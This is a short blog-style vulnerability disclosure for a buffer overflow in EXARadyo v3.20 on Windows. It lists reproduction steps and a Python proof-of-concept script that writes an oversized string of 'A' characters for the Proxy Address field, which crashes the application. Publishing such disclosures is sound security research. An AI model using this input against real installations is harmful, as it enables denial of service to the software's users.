---
layout: post
title: EXARadyo v3.20 - Buffer Overflow (PoC)
date: 2023-09-13
category: exploit
---

# Exploit Title: EXARadyo v3.20 - Buffer Overflow (PoC)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 13.09.2023
# Vendor Homepage: http://radyo.terkon.com
# Software Link: https://download.terkon.com/exaradyo.exe
# Tested Version: v3.20 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open the EXARadyo application.
2. Click on **Settings** from the hamburger menu.
3. Paste the content of `poc.txt` into the **Proxy Address** box.
4. Go to the **Favorite List** tab and double-click on any station.
5. The application should crash due to a buffer overflow.

### Proof of Concept (PoC)

The following script generates a `poc.txt` file with a payload that, when loaded into the **Proxy Address** field, causes the application to crash.

```python
#!/usr/bin/python

poc = 'A' * 7653

try:
    file = open("poc.txt", "w")
    file.write(poc)
    file.close()
    print("POC is created")
except Exception as e:
    print("POC is not created:", e)
